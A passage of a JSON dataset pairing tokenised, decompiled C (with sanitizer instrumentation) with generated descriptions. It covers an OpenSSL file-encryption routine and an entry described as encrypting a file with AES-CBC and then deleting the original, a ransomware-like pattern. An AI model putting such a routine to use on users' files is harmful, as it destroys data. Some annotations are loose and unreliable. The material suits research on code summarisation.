            "v2",
            "+",
            "16",
            ")",
            "=",
            "cipher",
            ";",
            "v4",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v4",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v4",
            "[",
            "536862721",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v4",
            "[",
            "536862722",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v4",
            "[",
            "536862755",
            "]",
            "=",
            "-",
            "202116109",
            ";",
            "v30",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v19",
            "[",
            "1",
            "]",
            "=",
            "v19",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "v1",
            "=",
            "pa",
            ";",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207120",
            ",",
            "pa",
            ")",
            ";",
            "}",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "cipher",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "cipher",
            ")",
            ";",
            "v5",
            "=",
            "(",
            "char",
            "*",
            "*",
            ")",
            "pa",
            "-",
            ">",
            "cipher",
            ";",
            "cipher_block_size",
            "=",
            "EVP_CIPHER_block_size",
            "(",
            "v5",
            ")",
            ";",
            "v6",
            "=",
            "cipher_block_size",
            "+",
            "1024",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1024",
            ",",
            "cipher_block_size",
            ")",
            ")",
            "{",
            "v1",
            "=",
            "(",
            "Params_0",
            "*",
            ")",
            "cipher_block_size",
            ";",
            "v5",
            "=",
            "&",
            "off_207660",
            ";",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_207660",
            ",",
            "cipher_block_size",
            ",",
            "1024L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "v6",
            "<",
            "=",
            "0",
            ")",
            "{",
            "v1",
            "=",
            "(",
            "Params_0",
            "*",
            ")",
            "v6",
            ";",
            "v5",
            "=",
            "&",
            "off_2070E0",
            ";",
            "__ubsan_handle_vla_bound_not_positive",
            "(",
            "&",
            "off_2070E0",
            ",",
            "v6",
            ")",
            ";",
            "}",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "v6",
            ",",
            "1L",
            "L",
            ")",
            ")",
            "{",
            "v1",
            "=",
            "(",
            "Params_0",
            "*",
            ")",
            "v6",
            ";",
            "v5",
            "=",
            "&",
            "off_2076A0",
            ";",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_2076A0",
            ",",
            "v6",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "v26",
            "=",
            "v6",
            "-",
            "1L",
            "L",
            ";",
            "n",
            "=",
            "v6",
            ";",
            "v21",
            "=",
            "0L",
            "L",
            ";",
            "v19",
            "[",
            "2",
            "]",
            "=",
            "v6",
            ";",
            "v19",
            "[",
            "3",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v7",
            "=",
            "alloca",
            "(",
            "16",
            "*",
            "(",
            "(",
            "v6",
            "+",
            "15L",
            "L",
            ")",
            "/",
            "0x10uL",
            "L",
            ")",
            ")",
            ";",
            "p_out_buf",
            "=",
            "(",
            "unsigned",
            "__int8",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "v19",
            ";",
            "num_bytes_read",
            "=",
            "100000",
            ";",
            "ctx",
            "=",
            "(",
            "EVP_CIPHER_CTX",
            "*",
            ")",
            "EVP_CIPHER_CTX_new",
            "(",
            "v5",
            ",",
            "v1",
            ",",
            "(",
            "v6",
            "+",
            "15L",
            "L",
            ")",
            "%",
            "0x10uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207180",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ")",
            ";",
            "}",
            "encrypt",
            "=",
            "pa",
            "-",
            ">",
            "encrypt",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2071E0",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "cipher",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "cipher",
            ")",
            ";",
            "EVP_CipherInit_ex",
            "(",
            "ctx",
            ",",
            "pa",
            "-",
            ">",
            "cipher",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "encrypt",
            ")",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207240",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ")",
            ";",
            "}",
            "if",
            "(",
            "pa",
            "-",
            ">",
            "encrypt",
            "=",
            "=",
            "1",
            ")",
            "{",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2072A0",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "out",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "out",
            ")",
            ";",
            "out",
            "=",
            "pa",
            "-",
            ">",
            "out",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207300",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "IV",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "IV",
            ")",
            ";",
            "IV",
            "=",
            "pa",
            "-",
            ">",
            "IV",
            ";",
            "if",
            "(",
            "!",
            "IV",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_207BC0",
            ")",
            ";",
            "if",
            "(",
            "!",
            "out",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_207C20",
            ")",
            ";",
            "fwrite",
            "(",
            "IV",
            ",",
            "1uL",
            "L",
            ",",
            "0x10uL",
            "L",
            ",",
            "out",
            ")",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207360",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "plaintext",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "plaintext",
            ")",
            ";",
            "plaintext",
            "=",
            "pa",
            "-",
            ">",
            "plaintext",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2073C0",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "IV",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "IV",
            ")",
            ";",
            "fread",
            "(",
            "pa",
            "-",
            ">",
            "IV",
            ",",
            "1uL",
            "L",
            ",",
            "0x10uL",
            "L",
            ",",
            "plaintext",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207420",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "encrypt",
            ")",
            ";",
            "}",
            "v12",
            "=",
            "pa",
            "-",
            ">",
            "encrypt",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207480",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "IV",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "IV",
            ")",
            ";",
            "v13",
            "=",
            "pa",
            "-",
            ">",
            "IV",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2074E0",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "key",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "key",
            ")",
            ";",
            "EVP_CipherInit_ex",
            "(",
            "ctx",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "pa",
            "-",
            ">",
            "key",
            ",",
            "v13",
            ",",
            "v12",
            ")",
            ";",
            "while",
            "(",
            "num_bytes_read",
            ">",
            "1023",
            ")",
            "{",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207540",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "plaintext",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "plaintext",
            ")",
            ";",
            "num_bytes_read",
            "=",
            "fread",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "96",
            ")",
            ",",
            "1uL",
            "L",
            ",",
            "0x400uL",
            "L",
            ",",
            "pa",
            "-",
            ">",
            "plaintext",
            ")",
            ";",
            "EVP_CipherUpdate",
            "(",
            "ctx",
            ",",
            "p_out_buf",
            ",",
            "v2",
            "+",
            "32",
            ",",
            "v2",
            "+",
            "96",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "num_bytes_read",
            ")",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2075A0",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "out",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "out",
            ")",
            ";",
            "v14",
            "=",
            "pa",
            "-",
            ">",
            "out",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "n",
            "=",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "v15",
            "=",
            "p_out_buf",
            ";",
            "if",
            "(",
            "!",
            "p_out_buf",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_207C80",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v14",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_207CE0",
            ")",
            ";",
            "fwrite",
            "(",
            "v15",
            ",",
            "1uL",
            "L",
            ",",
            "n",
            ",",
            "v14",
            ")",
            ";",
            "}",
            "EVP_CipherFinal_ex",
            "(",
            "ctx",
            ",",
            "p_out_buf",
            ",",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "!",
            "pa",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "pa",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207600",
            ",",
            "pa",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "pa",
            "-",
            ">",
            "out",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "pa",
            "-",
            ">",
            "out",
            ")",
            ";",
            "v16",
            "=",
            "pa",
            "-",
            ">",
            "out",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "v17",
            "=",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "v18",
            "=",
            "p_out_buf",
            ";",
            "if",
            "(",
            "!",
            "p_out_buf",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_207D40",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v16",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_207DA0",
            ")",
            ";",
            "fwrite",
            "(",
            "v18",
            ",",
            "1uL",
            "L",
            ",",
            "v17",
            ",",
            "v16",
            ")",
            ";",
            "EVP_CIPHER_CTX_reset",
            "(",
            "ctx",
            ")",
            ";",
            "free",
            "(",
            "ctx",
            ")",
            ";",
            "if",
            "(",
            "v22",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v2",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8088",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "v4",
            "+",
            "536862722",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v4",
            "+",
            "2147450880",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v4",
            "+",
            "2147450888",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "144",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1172321806L",
            "L",
            ";",
            "__asan_stack_free_5",
            "(",
            "v2",
            ",",
            "1152L",
            "L",
            ",",
            "v22",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `stack` appears to be related to data structures, particularly for implementing a stack, likely in a context related to a programming language's runtime environment or a binary search tree implementation.",
            "The `malloc` function is typically used for dynamic memory allocation in C programs, allowing for the allocation of memory space for variables and data structures at runtime, as demonstrated in the code snippets where it's defined and utilized for memory allocation tasks."
        ],
        "longer_label": "The provided code defines a function `cipher` which likely implements encryption or decryption functionality using the EVP cryptographic library in C, with annotations suggesting a possible relationship to stack data structures and dynamic memory allocation."
    },
    {
        "id": 186,
        "docstring_tokens": [
            "The",
            "code",
            "uses",
            "AES",
            "encryption",
            "with",
            "CBC",
            "mode",
            "to",
            "encrypt",
            "a",
            "file",
            "using",
            "a",
            "provided",
            "key",
            ",",
            "generates",
            "a",
            "random",
            "initialization",
            "vector",
            ",",
            "opens",
            "the",
            "input",
            "and",
            "output",
            "files",
            ",",
            "encrypts",
            "the",
            "input",
            "file",
            ",",
            "removes",
            "the",
            "original",
            "file",
            ",",
            "and",
            "frees",
            "the",
            "allocated",
            "memory",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "in",
            ",",
            "unsigned",
            "__int8",
            "*",
            "key",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v2",
            ";",
            "__int64",
            "v3",
            ";",
            "_DWORD",
            "*",
            "v4",
            ";",
            "__int64",
            "v5",
            ";",
            "__int64",
            "v6",
            ";",
            "__int64",
            "v7",
            ";",
            "__int64",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "char",
            "*",
            "v12",
            ";",
            "char",
            "*",
            "v13",
            ";",
            "__int64",
            "v14",
            ";",
            "__int64",
            "v15",
            ";",
            "__int64",
            "v16",
            ";",
            "Params_0",
            "*",
            "p",
            ";",
            "FILE",
            "*",
            "In",
            ";",
            "FILE",
            "*",
            "Out",
            ";",
            "char",
            "v21",
            "[",
            "4184",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v22",
            ";",
            "v2",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v21",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v3",
            "=",
            "__asan_stack_malloc_7",
            "(",
            "4160L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v3",
            ")",
            "v2",
            "=",
            "v3",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "8",
            ")",
            "=",
            "\"3 32 16 2 Iv 96 2000 3 out 2144 2000 7 message \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "16",
            ")",
            "=",
            "encryptAES",
            ";",
            "v4",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v4",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v4",
            "[",
            "536862721",
            "]",
            "=",
            "-",
            "219021312",
            ";",
            "v4",
            "[",
            "536862722",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v4",
            "[",
            "536862785",
            "]",
            "=",
            "-",
            "219021312",
            ";",
            "v4",
            "[",
            "536862786",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v4",
            "[",
            "536862849",
            "]",
            "=",
            "-",
            "219021312",
            ";",
            "v22",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "p",
            "=",
            "(",
            "Params_0",
            "*",
            ")",
            "malloc",
            "(",
            "0x38uL",
            "L",
            ")",
            ";",
            "v5",
            "=",
            "16L",
            "L",
            ";",
            "RAND_bytes",
            "(",
            "v2",
            "+",
            "32",
            ",",
            "16L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "p",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "p",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "v5",
            "=",
            "(",
            "__int64",
            ")",
            "p",
            ";",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2076E0",
            ",",
            "p",
            ")",
            ";",
            "}",
            "v7",
            "=",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "p",
            "-",
            ">",
            "key",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "(",
            "_BYTE",
            ")",
            "v7",
            ")",
            "__asan_report_store8",
            "(",
            "&",
            "p",
            "-",
            ">",
            "key",
            ",",
            "v5",
            ",",
            "v7",
            ",",
            "v6",
            ")",
            ";",
            "p",
            "-",
            ">",
            "key",
            "=",
            "key",
            ";",
            "if",
            "(",
            "!",
            "p",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "p",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "v5",
            "=",
            "(",
            "__int64",
            ")",
            "p",
            ";",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207740",
            ",",
            "p",
            ")",
            ";",
            "}",
            "v8",
            "=",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "p",
            "-",
            ">",
            "IV",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "(",
            "_BYTE",
            ")",
            "v8",
            ")",
            "__asan_report_store8",
            "(",
            "&",
            "p",
            "-",
            ">",
            "IV",
            ",",
            "v5",
            ",",
            "v8",
            ",",
            "v6",
            ")",
            ";",
            "p",
            "-",
            ">",
            "IV",
            "=",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ";",
            "v10",
            "=",
            "EVP_aes_256_cbc",
            "(",
            ")",
            ";",
            "if",
            "(",
            "!",
            "p",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "p",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "v5",
            "=",
            "(",
            "__int64",
            ")",
            "p",
            ";",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2077A0",
            ",",
            "p",
            ")",
            ";",
            "}",
            "v11",
            "=",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "p",
            "-",
            ">",
            "cipher",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "(",
            "_BYTE",
            ")",
            "v11",
            ")",
            "__asan_report_store8",
            "(",
            "&",
            "p",
            "-",
            ">",
            "cipher",
            ",",
            "v5",
            ",",
            "v11",
            ",",
            "v9",
            ")",
            ";",
            "p",
            "-",
            ">",
            "cipher",
            "=",
            "(",
            "const",
            "EVP_CIPHER",
            "*",
            ")",
            "v10",
            ";",
            "if",
            "(",
            "*",
            "(",
            "char",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "0",
            "|",
            "|",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "2095",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v2",
            "+",
            "47",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "2095",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
